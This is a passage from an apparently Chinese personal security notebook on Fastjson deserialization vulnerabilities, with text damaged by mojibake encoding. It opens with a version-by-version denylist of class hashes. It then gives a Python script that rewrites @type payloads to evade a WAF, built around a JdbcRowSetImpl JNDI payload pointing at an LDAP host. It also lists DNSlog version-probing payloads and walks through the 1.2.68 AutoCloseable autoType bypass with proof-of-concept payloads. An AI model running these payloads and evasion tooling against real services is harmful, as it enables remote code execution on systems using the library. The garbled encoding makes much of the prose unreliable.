1459860845934817624 0x144277b467723158L java.net.InetAddress 1.2.48 8409640769019589119 0x74b50bb9260e31ffL java.lang.Class 1.2.49 4904007817188630457 0x440e89208f445fb9L com.alibaba.fastjson.annotation 1.2.59 5100336081510080343 0x46c808a4b5841f57L org.apache.cxf.jaxrs.provider. 1.2.59 6456855723474196908 0x599b5c1213a099acL ch.qos.logback. 1.2.59 8537233257283452655 0x767a586a5107feefL net.sf.ehcache.transaction.manager. 1.2.60 3688179072722109200 0x332f0b5369a18310L com.zaxxer.hikari. 1.2.61 -4401390804044377335 0xc2eb1e621f439309L flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor 1.2.61 -1650485814983027158 0xe9184be55b1d962aL org.apache.openjpa.ee. 1.2.61 -1251419154176620831 0xeea210e8da2ec6e1L oracle.jdbc.rowset.OracleJDBCRowSet 1.2.61 -9822483067882491 0xffdd1a80f1ed3405L com.mysql.cj.jdbc.admin. 1.2.61 99147092142056280 0x1603dc147a3e358L oracle.jdbc.connector.OracleManagedConnectionFactory 1.2.61 3114862868117605599 0x2b3a37467a344cdfL org.apache.ibatis.parsing. 1.2.61 4814658433570175913 0x42d11a560fc9fba9L org.apache.axis2.jaxws.spi.handler. 1.2.61 6511035576063254270 0x5a5bd85c072e5efeL jodd.db.connection. 1.2.61 8925522461579647174 0x7bddd363ad3998c6L org.apache.commons.configuration.JNDIConfiguration 1.2.62 -9164606388214699518 0x80d0c70bcc2fea02L org.apache.ibatis.executor. 1.2.62 -8649961213709896794 0x87f52a1b07ea33a6L net.sf.cglib. 1.2.62 -6316154655839304624 0xa85882ce1044c450L oracle.net. 1.2.62 -5764804792063216819 0xafff4c95b99a334dL com.mysql.cj.jdbc.MysqlDataSource 1.2.62 -4608341446948126581 0xc00be1debaf2808bL jdk.internal. 1.2.62 -4438775680185074100 0xc2664d0958ecfe4cL aj.org.objectweb.asm. 1.2.62 -3319207949486691020 0xd1efcdf4b3316d34L oracle.jdbc. 1.2.62 -2192804397019347313 0xe1919804d5bf468fL org.apache.commons.collections.comparators. 1.2.62 -2095516571388852610 0xe2eb3ac7e56c467eL net.sf.ehcache.hibernate. 1.2.62 4750336058574309 0x10e067cd55c5e5L com.mysql.cj.log. 1.2.62 218512992947536312 0x3085068cb7201b8L org.h2.jdbcx. 1.2.62 823641066473609950 0xb6e292fa5955adeL org.apache.commons.logging. 1.2.62 1534439610567445754 0x154b6cb22d294cfaL org.apache.ibatis.reflection. 1.2.62 1818089308493370394 0x193b2697eaaed41aL org.h2.server. 1.2.62 2164696723069287854 0x1e0a8c3358ff3daeL org.apache.ibatis.datasource. 1.2.62 2653453629929770569 0x24d2f6048fef4e49L org.objectweb.asm. 1.2.62 2836431254737891113 0x275d0732b877af29L flex.messaging.util.concurrent. 1.2.62 3089451460101527857 0x2adfefbbfe29d931L org.apache.ibatis.javassist. 1.2.62 3256258368248066264 0x2d308dbbc851b0d8L java.lang.UNIXProcess 1.2.62 3718352661124136681 0x339a3e0b6beebee9L org.apache.ibatis.ognl. 1.2.62 4046190361520671643 0x3826f4b2380c8b9bL com.mysql.cj.jdbc.MysqlConnectionPoolDataSource 1.2.62 4841947709850912914 0x43320dc9d2ae0892L org.codehaus.jackson. 1.2.62 6280357960959217660 0x5728504a6d454ffcL org.apache.ibatis.scripting. 1.2.62 6534946468240507089 0x5ab0cb3071ab40d1L org.apache.commons.proxy. 1.2.62 6734240326434096246 0x5d74d3e5b9370476L com.mysql.cj.jdbc.MysqlXADataSource 1.2.62 7123326897294507060 0x62db241274397c34L org.apache.commons.collections.functors. 1.2.62 8488266005336625107 0x75cc60f5871d0fd3L org.apache.commons.configuration 1.2.66 -2439930098895578154 0xde23a0809a8b9bd6L javax.script. 1.2.66 -582813228520337988 0xf7e96e74dfa58dbcL javax.sound. 1.2.66 -26639035867733124 0xffa15bf021f1e37cL javax.print. 1.2.66 386461436234701831 0x55cfca0f2281c07L javax.activation. 1.2.66 1153291637701043748 0x100150a253996624L javax.tools. 1.2.66 1698504441317515818L 0x17924cca5227622aL javax.management. 1.2.66 7375862386996623731L 0x665c53c311193973L org.apache.xbean. 1.2.66 7658177784286215602L 0x6a47501ebb2afdb2L org.eclipse.jetty. 1.2.66 8055461369741094911L 0x6fcabf6fa54cafffL javax.naming. 1.2.67 -7775351613326101303L 0x941866e73beff4c9L org.apache.shiro.realm. 1.2.67 -6025144546313590215L 0xac6262f52c98aa39L org.apache.http.conn. 1.2.67 -5939269048541779808L 0xad937a449831e8a0L org.quartz. 1.2.67 -5885964883385605994L 0xae50da1fad60a096L com.taobao.eagleeye.wrapper 1.2.67 -3975378478825053783L 0xc8d49e5601e661a9L org.apache.http.impl. 1.2.67 -2378990704010641148L 0xdefc208f237d4104L com.ibatis. 1.2.67 -905177026366752536L 0xf3702a4a5490b8e8L org.apache.catalina. 1.2.67 2660670623866180977L 0x24ec99d5e7dc5571L org.apache.http.auth. 1.2.67 2731823439467737506L 0x25e962f1c28f71a2L br.com.anteros. 1.2.67 3637939656440441093L 0x327c8ed7c8706905L com.caucho. 1.2.67 4254584350247334433L 0x3b0b51ecbf6db221L org.apache.http.cookie. 1.2.67 5274044858141538265L 0x49312bdafb0077d9L org.javasimon. 1.2.67 5474268165959054640L 0x4bf881e49d37f530L org.apache.cocoon. 1.2.67 5596129856135573697L 0x4da972745feb30c1L org.apache.activemq.jms.pool. 1.2.67 6854854816081053523L 0x5f215622fb630753L org.mortbay.jetty. 1.2.68 -3077205613010077203L 0xd54b91cc77b239edL org.apache.shiro.jndi. 1.2.68 -2825378362173150292L 0xd8ca3d595e982bacL org.apache.ignite.cache.jta. 1.2.68 2078113382421334967L 0x1cd6f11c6a358bb7L javax.swing.J 1.2.68 6007332606592876737L 0x535e552d6f9700c1L org.aoju.bus.proxy.provider. 1.2.68 9140390920032557669L 0x7ed9311d28bf1a65L java.awt.p 1.2.68 9140416208800006522L 0x7ed9481d28bf417aL java.awt.i 1.2.69 -8024746738719829346L 0x90a25f5baa21529eL java.io.Serializable 1.2.69 -5811778396720452501L 0xaf586a571e302c6bL java.io.Closeable 1.2.69 -3053747177772160511L 0xd59ee91f0b09ea01L oracle.jms.AQ 1.2.69 -2114196234051346931L 0xe2a8ddba03e69e0dL java.util.Collection 1.2.69 -2027296626235911549L 0xe3dd9875a2dc5283L java.lang.Iterable 1.2.69 -2939497380989775398L 0xd734ceb4c3e9d1daL java.lang.Object 1.2.69 -1368967840069965882L 0xed007300a7b227c6L java.lang.AutoCloseable 1.2.69 2980334044947851925L 0x295c4605fd1eaa95L java.lang.Readable 1.2.69 3247277300971823414L 0x2d10a5801b9d6136L java.lang.Cloneable 1.2.69 5183404141909004468L 0x47ef269aadc650b4L java.lang.Runnable 1.2.69 7222019943667248779L 0x6439c4dff712ae8bL java.util.EventListener 1.2.70 -5076846148177416215L 0xb98b6b5396932fe9L org.apache.commons.collections4.Transformer 1.2.70 -4703320437989596122L 0xbeba72fb1ccba426L org.apache.commons.collections4.functors 1.2.70 -4314457471973557243L 0xc41ff7c9c87c7c05L org.jdom2.transform. 1.2.70 -2533039401923731906L 0xdcd8d615a6449e3eL org.apache.hadoop.shaded.com.zaxxer.hikari. 1.2.70 156405680656087946L 0x22baa234c5bfb8aL com.p6spy.engine. 1.2.70 1214780596910349029L 0x10dbc48446e0dae5L org.apache.activemq.pool. 1.2.70 3085473968517218653L 0x2ad1ce3a112f015dL org.apache.aries.transaction. 1.2.70 3129395579983849527L 0x2b6dd8b3229d6837L org.apache.activemq.ActiveMQConnectionFactory 1.2.70 4241163808635564644L 0x3adba40367f73264L org.apache.activemq.spring. 1.2.70 7240293012336844478L 0x647ab0224e149ebeL org.apache.activemq.ActiveMQXAConnectionFactory 1.2.70 7347653049056829645L 0x65f81b84c1d920cdL org.apache.commons.jelly. 1.2.70 7617522210483516279L 0x69b6e0175084b377L org.apache.axis2.transport.jms. 1.2.71 -4537258998789938600L 0xc1086afae32e6258L java.io.FileReader 1.2.71 -4150995715611818742L 0xc664b363baca050aL java.io.ObjectInputStream 1.2.71 -2995060141064716555L 0xd66f68ab92e7fef5L java.io.FileInputStream 1.2.71 -965955008570215305L 0xf2983d099d29b477L java.io.ObjectOutputStream 1.2.71 -219577392946377768L 0xfcf3e78644b98bd8L java.io.DataOutputStream 1.2.71 2622551729063269307L x24652ce717e713bbL java.io.PrintWriter 1.2.71 2930861374593775110L 0x28ac82e44e933606L java.io.Buffered 1.2.71 4000049462512838776L 0x378307cb0111e878L java.io.InputStreamReader 1.2.71 4193204392725694463L 0x3a31412dbb05c7ffL java.io.OutputStreamWriter 1.2.71 5545425291794704408L 0x4cf54eec05e3e818L java.io.FileWriter 1.2.71 6584624952928234050L 0x5b6149820275ea42L java.io.FileOutputStream 1.2.71 7045245923763966215L 0x61c5bdd721385107L java.io.DataInputStream Payloadè½¬æ¢ æœ‰äº›ä½¿ç”¨äº†å­˜åœ¨æ¼æ´çš„fastjsonç‰ˆæœ¬ï¼Œä½†æ˜¯æœ‰WAFåœ¨å¤–é¢ï¼Œæ‰€ä»¥æŠ„äº†ä¸€ä¸ªå¸ˆå‚…çš„è„šæœ¬ #!usr/bin/env python # -*- coding:utf-8 -*- \"\"\" @author: longofo @file: fastjson_fuzz.py @time: 2020/05/07 \"\"\" import json from json import JSONDecodeError class FastJsonPayload: def __init__(self, base_payload): try: json.loads(base_payload) except JSONDecodeError as ex: raise ex self.base_payload = base_payload def gen_common(self, payload, func): tmp_payload = json.loads(payload) dct_objs = [tmp_payload] while len(dct_objs) > 0: tmp_objs = [] for dct_obj in dct_objs: for key in dct_obj: if key == \"@type\": dct_obj[key] = func(dct_obj[key]) if type(dct_obj[key]) == dict: tmp_objs.append(dct_obj[key]) dct_objs = tmp_objs return json.dumps(tmp_payload) # å¯¹@typeçš„valueå¢åŠ Lå¼€å¤´ï¼Œ;ç»“å°¾çš„payload def gen_payload1(self, payload: str): return self.gen_common(payload, lambda v: \"L\" + v + \";\") # å¯¹@typeçš„valueå¢åŠ LLå¼€å¤´ï¼Œ;;ç»“å°¾çš„payload def gen_payload2(self, payload: str): return self.gen_common(payload, lambda v: \"LL\" + v + \";;\") # å¯¹@typeçš„valueè¿›è¡Œ\\u def gen_payload3(self, payload: str): return self.gen_common(payload, lambda v: ''.join('\\\\u{:04x}'.format(c) for c in v.encode())).replace(\"\\\\\\\\\", \"\\\\\") # å¯¹@typeçš„valueè¿›è¡Œ\\x def gen_payload4(self, payload: str): return self.gen_common(payload, lambda v: ''.join('\\\\x{:02x}'.format(c) for c in v.encode())).replace(\"\\\\\\\\\", \"\\\\\") # ç”Ÿæˆcacheç»•è¿‡payload def gen_payload5(self, payload: str): cache_payload = { \"rand1\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" } } cache_payload[\"rand2\"] = json.loads(payload) return json.dumps(cache_payload) def gen(self): payloads = [] payload1 = self.gen_payload1(self.base_payload) yield payload1 payload2 = self.gen_payload2(self.base_payload) yield payload2 payload3 = self.gen_payload3(self.base_payload) yield payload3 payload4 = self.gen_payload4(self.base_payload) yield payload4 payload5 = self.gen_payload5(self.base_payload) yield payload5 payloads.append(payload1) payloads.append(payload2) payloads.append(payload5) for payload in payloads: yield self.gen_payload3(payload) yield self.gen_payload4(payload) if __name__ == '__main__': fjp = FastJsonPayload('''{ \"rand1\": { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://localhost:1389/Object\", \"autoCommit\": true } }''') for payload in fjp.gen(): print(payload) print() Fastjsonå§¿åŠ¿æŠ€å·§é›†åˆ https://github.com/safe6Sec/Fastjson åšä¸ªå¤‡ä»½ï¼Œæ€•åˆ äº† # Fastjson Fastjsonå§¿åŠ¿æŠ€å·§é›†åˆ ## è¯´æ˜ 2021.8.10 å°å¼Ÿæ°´å¹³æœ‰é™ï¼Œ1.2.48ä¹‹åé«˜ç‰ˆæœ¬æ¼æ´æˆå› è¿˜æœªè¿›è¡Œç ”ç©¶æ¢ç´¢ï¼Œå¾ˆå¤šåˆ©ç”¨ç»†èŠ‚å’Œæ³¨æ„äº‹é¡¹éƒ½ä¸å¤Ÿå®Œæ•´ï¼Œå¾…æˆ‘æœ‰ç©ºæ…¢æ…¢è¡¥å……ã€‚ ## æ¢æµ‹ ç”¨æ¥æ¢æµ‹ç›®æ ‡ç‰ˆæœ¬ï¼Œæ‰èƒ½æ›´å¥½ç¡®å®šä½¿ç”¨çš„payloadã€‚è¿˜å¯ä»¥ç”¨æ¥åŒºåˆ†fastjsonå’ŒJackjsonã€‚ fastjsonæ¢æµ‹ç‰ˆæœ¬ï¼Œè¿˜å¯ä»¥ç”¨é”™è¯¯æ ¼å¼çš„jsonå‘è¿‡å»ã€‚å¦‚æœå¯¹æ–¹å¼‚å¸¸æœªå¤„ç†å¯æŠ¥å‡ºè¯¦ç»†ç‰ˆæœ¬ã€‚ ä¸»è¦æ˜¯åˆ©ç”¨å„ä¸ªç±»è¢«åŠ å…¥é»‘åå•çš„æ–¹å¼è¿›è¡Œåˆ¤æ–­ fastjson >1.2.43 ```java {\"@type\":\"java.net.URL\",\"val\":\"dnslog\"} ``` fastjson >1.2.48 ```java {\"@type\":\"java.net.InetAddress\",\"val\":\"dnslog\"} ``` fastjson >1.2.68 ```java {\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog\"} {\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog\"} {{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:\"aaa\"} {\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"http://dnslog\"}}\"\"} Set[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}] Set[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"} {\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dnslog\"}} {{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}:0 ``` ## å„ç‰ˆæœ¬åˆ©ç”¨ é™¤äº†è€ƒè™‘Fastjsonç‰ˆæœ¬ï¼Œè¿˜å¾—è€ƒè™‘JDKç‰ˆæœ¬ï¼Œä¸­é—´ä»¶ç‰ˆæœ¬ï¼Œç¬¬ä¸‰æ–¹ä¾èµ–ç‰ˆæœ¬ã€‚ JDKç‰ˆæœ¬å¯¹äºJDNIæ³¨å…¥çš„é™åˆ¶ï¼ŒåŸºäºRMIåˆ©ç”¨çš„JDKç‰ˆæœ¬ å‚è€ƒé“¾æ¥ Fastjsonç³»åˆ—ä¸‰â€”â€”å†å²ç‰ˆæœ¬è¡¥ä¸ç»•è¿‡ï¼ˆéœ€å¼€å¯AutoTypeï¼‰ Fastjsonååºåˆ—åŒ–æ¼æ´åˆ†æ Fastjson ååºåˆ—åŒ–æ¼æ´å² FastJson ååºåˆ—åŒ–å­¦ä¹  Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:52:00 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/07.Fastjson1.2.68åˆ†æ.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/07.Fastjson1.2.68åˆ†æ.html","title":"07.Fastjson1.2.68åˆ†æ","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 å‰è¨€ åˆ†æ1 åˆ†æ2 ThrowableDeserializer åˆ†æ åˆ©ç”¨ JavaBeanDeserializer åˆ†æ åˆ©ç”¨ AutoCloseableæ·±å…¥ä½¿ç”¨ å°çŸ¥è¯†1 å°çŸ¥è¯†2 å¥½å‘ çŸ¥è¯†ç‚¹3 åˆ©ç”¨é“¾æŒ–æ˜ é“¾åˆ©ç”¨ Mysql JDBC RCE mysql 5.1.x >= 5.1.11 Mysqlconnector 6.0.2 or 6.0.3 Mysqlconnector 6.x or commons-ioæ–‡ä»¶è¯»å– commons-io2.xæ–‡ä»¶å†™å…¥ æ€»ç»“ å‚è€ƒé“¾æ¥ å‰è¨€ 1.2.68æœ‰safeModeï¼Œä½†æ˜¯é»˜è®¤ä¸æ˜¯å¼€å¯çš„ï¼Œæ‰€ä»¥è¿˜æ˜¯æœ‰é£é™© åˆ†æ1 æ ¹æ®ç½‘ä¸Šä¿¡æ¯çš„æè¿°ï¼Œè¿™æ¬¡é—®é¢˜ç‚¹ä¸»è¦æ˜¯åœ¨checkAutoTypeå‚æ•°æœŸæœ›ç±»è¿™ä¸ªåœ°æ–¹ çœ‹çœ‹å“ªäº›åœ°æ–¹ä¼šè°ƒç”¨checkAutoTypeæ–¹æ³•å¹¶ä½¿ç”¨åˆ°æœŸæœ›ç±»è¿™ä¸ªå‚æ•° å‘ç°ä¸»è¦æ˜¯2ä¸ªåœ°æ–¹ä¼šä½¿ç”¨åˆ° com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze é‚£å“ªäº›åœ°æ–¹ä¼šä½¿ç”¨åˆ°è¿™ä¸¤ä¸ªç±»çš„å¯¹åº”çš„deserialzeæ–¹æ³•å‘¢ï¼Ÿ å‘ç°è¿™ä¸ªåœ°æ–¹åˆšå¥½æ˜¯å¸¸è§„çš„@typeè¿›è¡ŒcheckAutoTypeæ£€æŸ¥åè¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨åˆ°ï¼› å…ˆæ„é€ ååºåˆ—åŒ–å™¨ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬@typeçš„å€¼å¯¹åº”çš„ç±»æ„é€ çš„ååºåˆ—åŒ–å™¨æ˜¯JavaBeanDeserializeræˆ–è€…ThrowableDeserializerï¼Œå°±ä¼šè§¦å‘deserialzeï¼ŒåŒæ—¶æœ‰å¸Œæœ›è§¦å‘å¸¦æœ‰æœŸæœ›ç±»å‚æ•°çš„checkAutoTypeè¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ æ€»ç»“æˆä¸€å¥è¯å°±æ˜¯ï¼šå¯»æ‰¾æ€ä¹ˆæ‰èƒ½è°ƒç”¨åˆ°å¸¦æœ‰expectClasså‚æ•°çš„checkAutoTypeæ–¹æ³• åˆ†æ2 é‚£è¿™ä¿©ä¸ªååºåˆ—åŒ–å™¨æ˜¯æ€ä¹ˆæ„é€ å‡ºæ¥çš„å‘¢ï¼Ÿ æˆ‘ä»¬è·Ÿä¸€ä¸‹config.getDeserializer(clazz) é‡è½½ï¼Œç»è¿‡ä¸€ç³»åˆ—çš„å„ç§classçš„åˆ¤æ–­ï¼Œåˆ°äº†è¿™ å¦‚æœclazzæ˜¯Throwableçš„å­ç±»ï¼Œé‚£ä¹ˆå°±è¿”å›ThrowableDeserializer å¦‚æœæ‰€æœ‰æ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨createJavaBeanDeserializerå»æ–°å»ºJavaBeanDeserializer è·Ÿè¿›æ–°å»ºå‡½æ•°ï¼Œå‘ç°æ˜¯æ¥å£çš„æƒ…å†µï¼ŒasmEnableä¸ºfalseï¼Œå¯ä»¥åˆ›å»ºjavaBeanDeserializerå¯¹è±¡ï¼Œå¦åˆ™è°ƒç”¨çš„asmFactory.createJavaBeanDeserializerè¿›è¡Œåˆ›å»ºï¼Œä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ ThrowableDeserializer åˆ†æ è¦ä½¿ç”¨åˆ°com.alibaba.fastjson.parser.deserializer.ThrowableDeserializerè¿™ä¸ªååºåˆ—åŒ–å™¨ï¼Œæ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œé‚£ä¹ˆæˆ‘ä»¬@typeä¼ å…¥çš„å°±åº”è¯¥æ˜¯Throwableçš„å­ç±» æ‰€ä»¥pocï¼ˆè¿™é‡Œå°±ç›´æ¥ç”¨çš„ä»–æœ¬èº«äº†ï¼‰ å› ä¸ºjava.lang.Throwableä¸åœ¨mappingå’Œå¯ä¿¡ä»»çš„mapä¸­ï¼Œæ‰€ä»¥è¿™é‡Œè¦æ‰‹åŠ¨å¼€å¯autoTypeSupport ParserConfig.getGlobalInstance().setAutoTypeSupport(true); {\"@type\":\"java.lang.Throwable\", \"a\":\"b\"} è¿è¡Œï¼Œè·Ÿï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªæ—¶å€™æˆ‘ä»¬çš„ååºåˆ—åŒ–å™¨deserializerç¡®å®æ˜¯æˆ‘ä»¬é¢„è®¡çš„ThrowableDeserializerç±» è¿›å…¥deserializeï¼Œç„¶åä¸€ç›´F8ï¼Œå‘ç°payloadåç»­å‚æ•°æ»¡è¶³æ¡ä»¶é”®å€¼å¯¹çš„é”®æ˜¯@typeï¼Œå°±å¯ä»¥è°ƒç”¨å¸¦æœ‰æœŸæœ›ç±»å‚æ•°çš„checkAutoType æ‰€ä»¥ä¿®æ”¹ä¸€ä¸‹payload {\"@type\":\"java.lang.Throwable\", \"@type\":\"org.example.App\"} ç„¶åè·Ÿåˆ°åˆšæ‰çš„åœ°æ–¹ keyä¸º@typeï¼ŒexClassä¸ºæˆ‘ä»¬è¾“å…¥çš„@typeå¯¹åº”çš„å€¼org.example.Appï¼Œè¿›å…¥checkAutoTypeï¼ˆæœŸæœ›ç±»ä¸ºThrowable.classï¼Œå¹³æ—¶ä¸€èˆ¬ä¸ºnullï¼‰ é€šè¿‡å„ç§é»‘ç™½åå•çš„æ£€æŸ¥ï¼Œä¸€ç›´åˆ°è¿™ï¼ŒloadClassï¼ˆå› ä¸ºè¿™é‡Œå¼€å¯äº†autoTypeSupportï¼Œæ‰€ä»¥cacheClassä¸ºtrueï¼‰ è·Ÿè¿›çœ‹çœ‹ï¼Œå…¶å®å°±æ˜¯ç»™å®ƒåŠ åˆ°mappingä¸­ å†è¿”å›åˆ°checkAutoTypeç»§ç»­å¾€ä¸‹ï¼Œå¦‚æœä¼ å…¥çš„clazzæ˜¯æœŸæœ›ç±»çš„å­ç±»ï¼Œå°±é€šè¿‡autoTypeæ£€æŸ¥è¿”å›clazz ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„ç¬¬äºŒä¸ª@typeå¯¹åº”çš„ç±»å¿…é¡»æ˜¯æœŸæœ›ç±»java.lang.Throwableçš„å­ç±»ï¼Œæˆ‘ä»¬è¿™é‡Œæ˜¯è‡ªå·±éšä¾¿å†™çš„ä¸€ä¸ªç±»æ˜æ˜¾ä¸æ˜¯Throwableçš„å­ç±»ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œæ‰€ä»¥æ‰¾ä¸€ä¸ªå®ƒçš„å­ç±»æ”¹ä¸€ä¸‹payload {\"@type\":\"java.lang.Throwable\", \"@type\":\"java.lang.Error\"} è¿è¡Œåˆ°åˆšæ‰çš„åœ°æ–¹ï¼ŒæˆåŠŸè¿”å›clazz å¦‚æœpayloadä¸­è¿˜æœ‰å…¶ä»–çš„å‚æ•°ï¼Œå…³é”®å‚æ•°å¦‚messageä¼šè¢«ç”¨ä½œåç»­çš„æ„é€ å‡½æ•°çš„å‚æ•°ç­‰ï¼ŒotherValueså°±æ˜¯ä¼ å…¥çš„å…¶ä»–å‚æ•°ï¼Œæ¯”å¦‚\"a\":\"b\"è¿™ç§ï¼Œåœ¨åˆ›å»ºå®ä¾‹åä¼šè¿›è¡ŒsetValueæ“ä½œ å†å¾€åå°±æ˜¯åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œç”¨ä¸Šåˆšæ‰ä¼ å…¥çš„å‚æ•°å•¥çš„ è·Ÿè¿›å°±æ˜¯é€šè¿‡åå°„è·å–æ„é€ å‡½æ•°å†åˆ›å»ºå®ä¾‹ æœ‰å‚æ•°çš„æƒ…å†µä¸‹ä¼šæ‰§è¡ŒsetValueæ“ä½œï¼Œä¹Ÿå°±æ˜¯ä¼šè°ƒç”¨setXXXæ–¹æ³• åˆ©ç”¨ é€šè¿‡ä¸Šè¿°çš„åˆ†æï¼Œå¼€å¯astçš„æƒ…å†µä¸‹ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ‰¾åˆ°ä¸€ä¸ªjava.lang.Throwableçš„å­ç±»ï¼Œä¸”å…¶çš„setteræˆ–è€…getterèƒ½æ‰§è¡Œå±é™©æ“ä½œï¼Œå°±æœ‰å¯åˆ©ç”¨çš„å«Œç–‘ é™å®šäº†å¯ä»¥åˆ©ç”¨çš„ç±»å¿…é¡»æ˜¯Throwableçš„å­ç±»ï¼Œä¸è¿‡å¼‚å¸¸ç±»å¾ˆå°‘ä½¿ç”¨é«˜å±å‡½æ•°ã€‚ã€‚ã€‚æ‰€ä»¥å¾ˆé¸¡è‚‹å§ éœ€è¦å¼€å¯ASTï¼Œæ›´é¸¡è‚‹äº†ï¼Œéšä¾¿æ‰¾ä¸ªä¸åœ¨é»‘åå•çš„ç±»éƒ½å¯ä»¥åˆ©ç”¨äº† ä¸¾ä¸ªä¾‹å­ï¼š æ¶æ„ç±» package org.example; import lombok.Data; @Data public class User extends Error{ private String test; public void setTest(String test) { System.out.println(\"call setTest\"); System.out.println(\"test value: \" + test); this.test = test; } } payload {\"@type\":\"java.lang.Throwable\", \"@type\":\"org.example.User\", \"test\":\"hahahaha\"} JavaBeanDeserializer åˆ†æ åœ¨è·å–ååºåˆ—åŒ–å™¨çš„æ—¶å€™ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªæ¥å£ï¼Œä¸”é‡Œé¢æ‰€æœ‰çš„åˆ¤æ–­éƒ½ä¸æ»¡è¶³ï¼Œå°±ä¼šè¿”å›JavaBeanDeserializer æˆ‘ä»¬éšä¾¿åˆ›å»ºä¸€ä¸ªæ¥å£ package org.example; public interface Test { } payload {\"@type\":\"org.example.Test\", \"test\":\"hahahaha\"} è¿è¡Œï¼Œä¸€ç›´åˆ°è·å–äº†ååºåˆ—åŒ–å™¨è¿›è¡Œååºåˆ—åŒ– è·Ÿè¿›ï¼Œçœ‹çœ‹é‡Œé¢çš„åˆ¤æ–­æ¡ä»¶ï¼Œä¸€é˜µF8åï¼Œçœ‹åˆ°äº†ç†Ÿæ‚‰çš„ä¸œè¥¿ ä¹Ÿå°±æ˜¯è¯´å’Œåˆšæ‰é‚£ä¸ªä¸€æ ·ï¼Œè¿˜å¾—éœ€è¦ä¸€ä¸ª@typeï¼Œä¿®æ”¹payload {\"@type\":\"org.example.Test\", \"@type\":\"org.example.Test1\", \"test\":\"hahahaha\"} ç†Ÿæ‚‰çš„å‘³é“ å¾€ä¸‹ï¼Œè¿›å…¥checkAutoTypeï¼ŒexpectClassä¸ºæˆ‘ä»¬ä¼ å…¥çš„ç¬¬ä¸€ä¸ªæ¥å£ åˆä¸€ç›´F8ï¼Œæ¥åˆ°äº†ç†Ÿæ‚‰çš„åœ°æ–¹ï¼ŒloadClassï¼Œç»™æˆ‘ä»¬çš„ä¼ å…¥çš„ç¬¬äºŒä¸ª@typeçš„ç±»åŠ å…¥åˆ°mappingä¸­ å†å¾€åï¼Œè¿™å‡ è¡ŒåŸºæœ¬æœç»äº†JNDIæ³¨å…¥çš„é£é™© å†ç»§ç»­å¾€ä¸‹ï¼Œclazzå¿…é¡»æ˜¯expectClassçš„å­ç±»ï¼Œå’Œä¸Šé¢é‚£ä¸ªç±»ä¼¼ æˆ‘ä»¬æŠŠæ¥å£Test1å˜æˆTestçš„å­ç±»ï¼Œç„¶åç»§ç»­ é€šè¿‡éªŒè¯ï¼Œokï¼Œè¿”å›clazz è¿”å›å°±æ˜¯å¸¸è§„çš„setValueäº† åˆ©ç”¨ å’Œä¸Šé¢é‚£ä¸ªå·®ä¸å¤šä¸€æ ·ï¼Œåªä¸è¿‡è¿™ä¸ªåº”ç”¨æ›´å¹¿æ³›ï¼Œåªéœ€è¦æ‰¾ä¸€ä¸ªæ¥å£ï¼Œç„¶åæ‰¾ä¸€ä¸ªå®ç°äº†è¿™ä¸ªæ¥å£çš„ç±»ï¼Œç±»ä¸­æœ‰å¯ä»¥åˆ©ç”¨çš„ç‚¹å³å¯ï¼›æœ€å¥½æ˜¯å¯ä»¥ç»•è¿‡autoTypeSupport äºæ˜¯å¤§ä½¬ä»¬æ‰¾åˆ°äº†java.lang.AutoCloseableè¿™ä¸ªæ¥å£ï¼Œè¿™ä¸ªæ¥å£ä½äºé»˜è®¤çš„mappingä¸­ï¼Œæœ‰å¾ˆå¤šå­ç±»ï¼Œä¸å¼€å¯autoTypeSupportä¹Ÿå¯ä»¥ç”¨ï¼ˆå¤§ä½¬ä»¬çœŸç‰›ï¼‰ æœ¬åœ°å…ˆæµ‹è¯•ä¸‹ï¼Œè¯æ˜æˆ‘ä»¬çš„çŒœæƒ³æ˜¯ä¸æ˜¯æ­£ç¡®çš„ï¼Œç¼–å†™ä¸ªæ¶æ„çš„ç±»ï¼Œå®ç°java.lang.AutoCloseableæ¥å£ package org.example; public class User implements AutoCloseable{ private String test; public void setTest(String test) { System.out.println(\"call setTest\"); System.out.println(\"test value: \" + test); this.test = test; } @Override public void close() throws Exception { } } payloadï¼ˆä¸å¼€å¯autoTypeSupportï¼‰ {\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.example.User\", \"test\":\"hahahaha\"} Bingo!!! AutoCloseableæ·±å…¥ä½¿ç”¨ å°çŸ¥è¯†1 fastjsoné™¤äº†ä½¿ç”¨setXXXçš„æ–¹æ³•èµ‹å€¼å¤–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å¯¹æ„é€ 